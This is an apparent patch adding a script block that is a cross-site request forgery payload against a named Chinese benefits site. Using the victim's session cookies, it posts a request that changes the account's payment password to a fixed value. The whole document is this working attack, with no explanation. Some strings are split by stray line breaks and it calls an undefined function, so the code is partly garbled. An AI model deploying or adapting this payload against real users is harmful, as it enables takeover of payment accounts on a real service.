@@ -1,0 +1,23 @@
+<script>
+var xhr=new XMLHttpRequest();
+xhr.open
+
+('POST','https://benefit.fesco.com.cn/MyAccount/Regnewpaypass.aspx?
+
+Length=13',false);
+xhr.setRequestHeader('content-type', 'application/x-www-form-
+
+urlencoded');
+xhr.withCredentials = true;
+xhr.onreadystatechange=function(){
+   if(xhr.readyState==4){
+	if(xhr.status==200 || xhr.status==304){
+                    console.log(xhr.responseText);
+                    fn.call(xhr.responseText);
+                }
+            }
+        }
+xhr.send
+
+('pagekey=aaaa&Tel=1&txtNewpass=12345qwert&txtChkpass=12345qwert');
+</script>
